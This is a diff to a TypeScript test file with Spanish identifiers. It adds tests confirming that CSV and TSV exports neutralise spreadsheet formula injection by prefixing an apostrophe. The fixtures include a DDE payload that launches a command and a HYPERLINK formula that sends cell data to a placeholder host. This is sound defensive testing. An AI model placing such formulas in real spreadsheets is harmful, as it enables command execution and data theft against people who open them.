@@ -9,7 +9,9 @@ import {
   escribirCsv,
   escribirErrores,
   escribirJson,
+  escribirTabla,
   formatearExperiencia,
+  sinNeutralizar,
   leer,
   leerExperiencia,
   normalizarEncabezado,
@@ -159,5 +161,30 @@ describe("archivo de filas con error (HU-142)", () => {
       { Código: "PS-1001", Años: "muchos", "Notas, con coma": 'dijo "hola"', motivo: "Años: «muchos» no es un número" },
       { Código: "PS-1002", "Notas, con coma": "a\tb", motivo: "Código: repetido" },
     ]);
+  });
+});
+
+describe("las hojas exportadas no ejecutan fórmulas al abrirse (Release Gate R0, security MEDIO-1)", () => {
+  const PELIGROSAS = ["=1+1", "+cmd|' /C calc'!A0", "-2+3", "@SUM(A1)", "\tx", "\rx"];
+
+  it("escribirTabla antepone un apóstrofo a las celdas que Excel leería como fórmula, en CSV y TSV", () => {
+    for (const formato of ["csv", "tsv"] as const) {
+      const salida = escribirTabla(formato, ["a"], PELIGROSAS.map((c) => [c]));
+      for (const c of ["=1+1", "@SUM(A1)", "-2+3"]) expect(salida, `${formato} ${c}`).toContain(`'${c}`);
+      expect(salida).not.toMatch(/(^|[\n,\t])=1\+1/);
+    }
+  });
+
+  it("escribirCsv también, sin tocar el texto normal ni las fechas", () => {
+    const salida = escribirCsv([{ codigo: "PS-0142", resumen: '=HYPERLINK("https://x/?d="&B2,"ver")', disponibilidad: "2026-11-01" }]);
+    expect(salida).toContain(`"'=HYPERLINK(""https://x/?d=""&B2,""ver"")"`);
+    expect(salida).toContain(",2026-11-01,");
+    expect(salida).toContain("PS-0142");
+  });
+
+  it("al volver a importar, el apóstrofo de neutralizar se quita (la ida y vuelta queda igual)", () => {
+    for (const c of PELIGROSAS) expect(sinNeutralizar(`'${c}`)).toBe(c);
+    expect(sinNeutralizar("'normal")).toBe("'normal");
+    expect(sinNeutralizar("texto")).toBe("texto");
   });
 });
